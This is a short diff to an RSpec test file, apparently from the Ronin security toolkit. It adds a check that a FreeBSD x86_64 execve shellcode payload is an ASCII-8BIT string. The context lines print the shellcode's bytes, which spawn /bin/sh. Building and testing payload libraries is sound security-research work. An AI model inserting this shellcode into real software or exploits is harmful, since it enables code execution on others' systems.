@@ -38,5 +38,9 @@ describe Ronin::Payloads::Shellcode::FreeBSD::X86_64::Execve do
         "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
       )
     end
+
+    it "must ensure #payload is an ASCII 8bit string" do
+      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
+    end
   end
 end
